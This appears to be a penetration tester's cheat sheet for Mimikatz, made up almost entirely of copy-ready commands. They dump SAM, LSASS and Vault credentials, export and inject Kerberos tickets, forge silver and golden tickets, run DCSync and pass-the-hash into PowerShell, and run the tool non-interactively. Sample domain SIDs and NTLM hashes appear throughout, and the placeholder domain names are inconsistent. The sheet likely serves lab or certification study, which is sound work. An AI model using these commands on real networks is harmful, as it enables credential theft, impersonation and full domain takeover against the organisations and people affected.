> Mimikatz uses admin rights on Windows to display passwords of currently logged in users in plaintext.


#Password_Attacks #Active_Directory_Authentication #NTLM_Hash

# Binary Location

Copy to current directory
```
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

# Usage

Enable `SeDebugPrivilege`
```
privilege::debug
```
- Allows us to interact with a process owned by another account

Elevate to `SYSTEM` user privileges
```
token::elevate
```

Dump NTLM hashes from the local Security Account Manager (SAM)
```
lsadump::sam
```

Dump hashes of all logged-on users stored in LSASS including cached hashes.
```
sekurlsa::logonpasswords
```

Extract saved credentials in the Windows Vault
```
vault::list
```

Extract Kerberos tickets stored in memory 
```
sekurlsa::tickets
```
- TGS allows us access to only particular resources associated with those tickets
- TGT allows us to request a TGS for specific resources within the domain

Export Kerberos tickets stored in memory 
```
sekurlsa::tickets /export
```
- Parses the LSASS process space in memory for any TGT/TGS
- TGT/TGS saved to disk in the kirbi mimikatz format.

Verify newly exported Kerberos tickets
```
dir *.kirbi
```

Inject selected TGS into process memory
```
kerberos::ptt [0;12bd0]-0-0-69690000-salesman@cifs-web69.kirbi
```

Forging the service ticket (silver ticket) and injecting it into the current session
```
kerberos::golden /sid:S-1-5-21-1012417518-619054555-1643581859 /domain:heentai.com /ptt /target:web69.heentai.com /service:http /rc4:37f0cccd4a7142da54e2845fb2685809 /user:salesadmin
```
- Forging a silver ticket:
	- `/sid`
		- Domain SID
	- `/domain:`
		- Domain name
	- `/ptt`
		- Allows us to inject the forged ticket into the memory of the machine we execute the command on
	- `/target:`
		- Target where the SPN runs
	- `/service:`
		- SPN protocol
	- `/rc4:`
		- NTLM hash of the SPN
	- `/user:`
		- Any existing domain user
			- Since we can set the permissions and groups

Perform a domain controller synchronization
- Request NTLM hash of user by impersonating a domain controller using replication
```
lsadump::dcsync /user:hentai\salesadmin
```
- Requires current user to be in either: 
	- Domain Admins
	- Enterprise Admins
	- Administrators

#Pass_the_Hash #Over_Pass_the_Hash

Creating a process by passing the hash
```
sekurlsa::pth /user:hentaisalesman /domain:hentai.com /ntlm:187c334a36459def79db542f67b37069 /run:powershell
```
- `/user:`
	- User to run process as
- `/domain:`
	- Domain
- `/ntlm:`
	- NTLM hash of user to run process as
- `/run:`
	- specify the process to create E.g., PowerShell
- Over Pass the Hash
	- Generate a TGT by authenticating to a network share

Extract hashes from memory from LSASS.exe (LSA server)
```
lsadump::lsa /patch
```

Delete any existing Kerberos tickets
```
kerberos::purge
```

Creating a golden ticket
```
kerberos::golden /user:salesman /domain:hentai.com /sid:S-1-5-21-1379870269-650598969-1781884369 /krbtgt:fa8c77fa44f511873c6aec2f11ef3469 /ptt
```
- Forging a golden ticket:
	- `/user:`
		- Any existing domain user
			- Since we can set the permissions and groups
	- `/domain:`
		- Domain name
	- `/sid`
		- Domain SID
	- `krbtgt`
		- password hash of the _krbtgt_ user account
	- `/ptt`
		- Allows us to inject the forged ticket into the memory of the machine we execute the command on

Launch a new command prompt
```
misc::cmd
```

Run mimikatz not interactively
```
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"
```

Run mimikatz not interactively with powershell
```
$results = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
```